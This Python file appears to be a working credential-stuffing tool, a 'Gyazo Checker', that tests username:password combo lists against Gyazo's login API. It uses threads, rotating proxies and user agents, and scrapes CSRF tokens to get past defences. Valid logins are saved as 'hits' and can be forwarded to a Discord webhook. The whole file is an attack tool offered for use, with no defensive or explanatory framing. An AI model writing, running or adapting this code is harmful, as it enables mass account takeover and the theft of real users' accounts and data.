from colorama import init,Fore,Style
from os import name,system
from sys import stdout
from random import choice
from threading import Thread,Lock,active_count
from time import sleep
from bs4 import BeautifulSoup
from datetime import datetime
import requests
import json

class Main:
    def clear(self):
        if name == 'posix':
            system('clear')
        elif name in ('ce', 'nt', 'dos'):
            system('cls')
        else:
            print("\n") * 120

    def SetTitle(self,title:str):
        if name == 'posix':
            stdout.write(f"\x1b]2;{title}\x07")
        elif name in ('ce', 'nt', 'dos'):
            system(f'title {title}')
        else:
            stdout.write(f"\x1b]2;{title}\x07")

    def PrintText(self,bracket_color:Fore,text_in_bracket_color:Fore,text_in_bracket,text):
        self.lock.acquire()
        stdout.flush()
        text = text.encode('ascii','replace').decode()
        stdout.write(Style.BRIGHT+bracket_color+'['+text_in_bracket_color+text_in_bracket+bracket_color+'] '+bracket_color+text+'\n')
        self.lock.release()

    def ReadFile(self,filename,method):
        with open(filename,method,encoding='utf8') as f:
            content = [line.strip('\n') for line in f]
            return content

    def ReadJson(self,filename,method):
        with open(filename,method) as f:
            return json.load(f)

    def GetRandomProxy(self):
        proxies_file = self.ReadFile('[Data]/proxies.txt','r')
        proxies = {}
        if self.proxy_type == 1:
            proxies = {
                "http":"http://{0}".format(choice(proxies_file)),
                "https":"https://{0}".format(choice(proxies_file))
            }
        elif self.proxy_type == 2:
            proxies = {
                "http":"socks4://{0}".format(choice(proxies_file)),
                "https":"socks4://{0}".format(choice(proxies_file))
            }
        else:
            proxies = {
                "http":"socks5://{0}".format(choice(proxies_file)),
                "https":"socks5://{0}".format(choice(proxies_file))
            }
        return proxies

    def TitleUpdate(self):
        while True:
            self.SetTitle(f'[One Man Builds Gyazo Checker Tool] ^| HITS: {self.hits} ^| BADS: {self.bads} ^| WEBHOOK RETRIES: {self.webhook_retries} ^| RETRIES: {self.retries} ^| THREADS: {active_count()-1}')
            sleep(0.1)

    def GetRandomUserAgent(self):
        useragents = self.ReadFile('[Data]/useragents.txt','r')
        return choice(useragents)

    def __init__(self):
        init(convert=True)
        self.clear()
        self.SetTitle('[One Man Builds Gyazo Checker Tool]')
        self.title = Style.BRIGHT+Fore.GREEN+"""                                        
                                 ╔══════════════════════════════════════════════════╗
                                        ╔═╗╦ ╦╔═╗╔═╗╔═╗  ╔═╗╦ ╦╔═╗╔═╗╦╔═╔═╗╦═╗
                                        ║ ╦╚╦╝╠═╣╔═╝║ ║  ║  ╠═╣║╣ ║  ╠╩╗║╣ ╠╦╝
                                        ╚═╝ ╩ ╩ ╩╚═╝╚═╝  ╚═╝╩ ╩╚═╝╚═╝╩ ╩╚═╝╩╚═
                                 ╚══════════════════════════════════════════════════╝
                                                                                                                                
        """
        print(self.title)
        self.hits = 0
        self.bads = 0
        self.retries = 0
        self.webhook_retries = 0
        self.lock = Lock()

        config = self.ReadJson('[Data]/configs.json','r')

        self.use_proxy = config['use_proxy']
        self.proxy_type = config['proxy_type']
        self.threads_num = config['threads']
        self.webhook_enable = config['webhook_enable']
        self.webhook_url = config['webhook_url']
        
        print('')

    def SendWebhook(self,title,message,icon_url,thumbnail_url,proxy,useragent):
        try:
            timestamp = str(datetime.utcnow())

            message_to_send = {"embeds": [{"title": title,"description": message,"color": 65362,"author": {"name": "AUTHOR'S DISCORD SERVER [CLICK HERE]","url": "https://discord.gg/9bHfzyCjPQ","icon_url": icon_url},"footer": {"text": "MADE BY ONEMANBUILDS","icon_url": icon_url},"thumbnail": {"url": thumbnail_url},"timestamp": timestamp}]}
            
            headers = {
                'User-Agent':useragent,
                'Pragma':'no-cache',
                'Accept':'*/*',
                'Content-Type':'application/json'
            }

            payload = json.dumps(message_to_send)

            if self.use_proxy == 1:
                response = requests.post(self.webhook_url,data=payload,headers=headers,proxies=proxy)
            else:
                response = requests.post(self.webhook_url,data=payload,headers=headers)

            if response.text == "":
                pass
            elif "You are being rate limited." in response.text:
                self.webhook_retries += 1
                self.SendWebhook(title,message,icon_url,thumbnail_url,proxy,useragent)
            else:
                self.webhook_retries += 1
                self.SendWebhook(title,message,icon_url,thumbnail_url,proxy,useragent)
        except:
            self.webhook_retries += 1
            self.SendWebhook(title,message,icon_url,thumbnail_url,proxy,useragent)

    def Gyazo(self,username,password):
        try:
            session = requests.session()

            link = 'https://gyazo.com/login'

            useragent = self.GetRandomUserAgent()

            headers = {
                "User-Agent": useragent
            }

            response = session.get(link,headers=headers)

            gyazo_session = response.cookies['Gyazo_session']

            cookies = {
                'Gyazo_session':gyazo_session
            }

            auth_link = 'https://gyazo.com/api/internal/sessions'

            soup = BeautifulSoup(response.text,'html.parser')
            csrf_token = soup.find('meta',{'name':'csrf-token'})['content']

            response = ''
            proxy = ''

            headers = {
                "User-Agent": useragent,
                'x-csrf-token':csrf_token
            }

            json_payload = {}
            json_payload['email'] = username
            json_payload['origin'] = None,
            json_payload['password'] = password

            if self.use_proxy == 1:
                proxy = self.GetRandomProxy()
                response = session.post(auth_link,headers=headers,cookies=cookies,json=json_payload,proxies=proxy)
            else:
                response = session.post(auth_link,headers=headers,cookies=cookies,json=json_payload)

            if 'Invalid email or password' in response.text:
                self.PrintText(Fore.WHITE,Fore.RED,'BAD',f'{username}:{password}')
                with open('[Data]/[Results]/bads.txt','a',encoding='utf8') as f:
                    f.write(f'{username}:{password}\n')
                self.bads += 1
            elif 'loggedin' in response.text:
                self.PrintText(Fore.WHITE,Fore.GREEN,'HIT',f'{username}:{password}')
                with open('[Data]/[Results]/hits.txt','a',encoding='utf8') as f:
                    f.write(f'{username}:{password}\n')
                self.hits += 1
                if self.webhook_enable == 1:
                    self.SendWebhook('Gyazo Account',f'{username}:{password}','https://cdn.discordapp.com/attachments/776819723731206164/796935218166497352/onemanbuilds_new_logo_final.png','https://upload.wikimedia.org/wikipedia/commons/4/45/Gyazo_logo.png',proxy,useragent)
            else:
                self.retries += 1
                self.Gyazo(username,password)
        except:
            self.retries += 1
            self.Gyazo(username,password)

    def Start(self):
        Thread(target=self.TitleUpdate).start()
        combos = self.ReadFile('[Data]/combos.txt','r')
        for combo in combos:
            Run = True
            username = combo.split(':')[0]
            password = combo.split(':')[-1]

            while Run:
                if active_count()<=self.threads_num:
                    Thread(target=self.Gyazo,args=(username,password)).start()
                    Run = False

if __name__ == '__main__':
    main = Main()
    main.Start()